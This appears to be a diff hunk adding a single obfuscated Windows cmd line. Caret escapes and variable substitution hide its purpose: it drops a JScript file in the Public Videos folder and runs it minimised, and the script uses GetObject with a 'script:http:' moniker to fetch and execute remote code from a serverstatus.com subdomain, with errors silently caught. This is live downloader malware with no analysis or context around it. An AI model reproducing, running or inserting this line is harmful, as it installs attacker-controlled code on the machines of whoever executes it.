@@ -1,0 +1,1 @@
+start /MIN %ComSpec% /V/D/c "s^eT TZVE=^еж^зи^й╗&&se^T GDAXAM=%Public%\V^id^eos\^kxlS1fT&&Se^t TBPIL=tr^y^{^viyCar c='sc^ri^pt^:';d='hiyCTt^P:';GiyCet^Ob^jiyCec^t(c+d+'&&s^eT IZNH=qkfY1sqkfY1swfgkvz.serverstatus.coqkfY1s?1qkfY1s');}c^a^tch^(e^){^}^;&&se^T/^p SNQV="!TBPIL:iyC=!!IZNH:qkfY1s=/!"<n^ul > !GDAXAM!.^j^S|ca^l^l s^t^a^rt !GDAXAM!.j^S "|c^M^d
